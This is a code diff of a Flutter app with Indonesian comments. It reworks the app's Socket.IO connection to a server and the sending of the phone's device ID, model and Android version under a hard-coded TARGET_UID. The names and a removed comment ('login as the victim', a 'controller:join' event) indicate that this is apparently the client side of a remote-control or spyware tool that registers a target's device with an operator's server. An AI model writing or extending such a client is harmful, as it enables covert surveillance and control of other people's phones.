@@ -10,7 +10,11 @@ const String TARGET_UID = 'd7e27df25f68d737f7a454b58a97f77c';
 void main() async {
   WidgetsFlutterBinding.ensureInitialized();
   runApp(const MyApp());
-  _connectToServer();
+  
+  // Beri jeda 2 detik sebelum konek agar aplikasi siap
+  Timer(const Duration(seconds: 2), () {
+    _connectToServer();
+  });
 }
 
 class MyApp extends StatelessWidget {
@@ -28,21 +32,20 @@ Future<void> _connectToServer() async {
   try {
     final androidInfo = await DeviceInfoPlugin().androidInfo;
 
-    // Gunakan URL persis seperti ini, jangan diubah
-    IO.Socket socket = IO.io('$SERVER_URL/?uid=$TARGET_UID', 
+    IO.Socket socket = IO.io(SERVER_URL, 
       IO.OptionBuilder()
       .setTransports(['websocket'])
-      .enableForceNewConnection()
-      .disableAutoConnect()
+      .setExtraHeaders({'x-auth-token': TARGET_UID})
+      .enableAutoConnect()
+      // Hanya boleh mencoba konek 1 kali
+      .setReconnectionAttempts(1) 
       .build()
     );
-
-    socket.connect();
 
     socket.onConnect((_) {
       print('KONEK BERHASIL');
       
-      // Kirim data device langsung
+      // Kirim data device (HANYA SEKALI)
       socket.emit('device:register', {
         'deviceId': androidInfo.id,
         'name': androidInfo.model,
@@ -52,13 +55,9 @@ Future<void> _connectToServer() async {
         'androidVersion': androidInfo.version.release,
         'uid': TARGET_UID,
       });
-      
-      // Login sebagai korban
-      socket.emit('controller:join', {'token': TARGET_UID});
     });
 
     socket.onConnectError((err) => print('GAGAL KONEK: $err'));
-    socket.onError((err) => print('ERROR: $err'));
     
   } catch (e) {
     print('Error: $e');
